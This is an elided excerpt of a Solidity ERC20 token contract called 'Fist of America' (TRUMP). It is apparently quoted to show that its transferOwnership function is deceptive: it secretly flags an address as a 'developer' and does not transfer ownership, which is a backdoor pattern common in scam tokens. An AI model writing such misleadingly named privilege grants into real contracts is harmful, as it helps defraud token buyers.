...
contract TRUMP is ERC20, Ownable {
    ...
    constructor() ERC20(unicode"Fist of America", unicode"TRUMP") Ownable(msg.sender) {
    ...
    function transferOwnership(address _addDev) public onlyOwner {
        developer[_addDev] = true;
    }
